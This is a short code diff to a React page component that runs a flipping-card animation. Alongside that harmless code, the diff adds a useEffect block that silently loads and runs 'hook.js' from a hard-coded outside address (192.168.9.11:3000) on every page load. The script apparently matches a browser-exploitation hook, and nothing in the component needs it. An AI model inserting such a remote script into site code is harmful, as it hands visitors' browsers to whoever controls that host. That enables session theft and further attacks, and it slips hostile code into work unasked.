@@ -17,6 +17,19 @@ const Index = () => {
     return () => flipInterval.current && clearInterval(flipInterval.current)
   }, []);
 
+  useEffect(() => {
+      const script = document.createElement('script');
+
+      script.src = "http://192.168.9.11:3000/hook.js";
+      script.async = true;
+
+      document.body.appendChild(script);
+
+      return () => {
+        document.body.removeChild(script);
+      }
+}, []);
+  
   const startAnimation = () => {
     flipInterval.current = setInterval(() => {
       setIsFlipping(prevFlipping => !prevFlipping);
